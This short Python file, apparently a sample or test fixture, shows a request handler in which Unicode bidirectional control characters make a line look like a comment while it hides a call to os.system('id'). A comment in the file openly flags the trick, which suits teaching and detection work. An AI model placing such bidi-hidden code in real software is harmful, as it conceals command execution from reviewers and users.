"""Request handler."""


def handle_request(body: str) -> dict:
    """Process an incoming request."""
    data = body.strip()
    # Looks like a comment but the bidi chars hide real code
    ⁦# harmless comment⁩⁦⁢__import__("os").system("id")⁩
    return {"status": "ok", "length": len(data)}
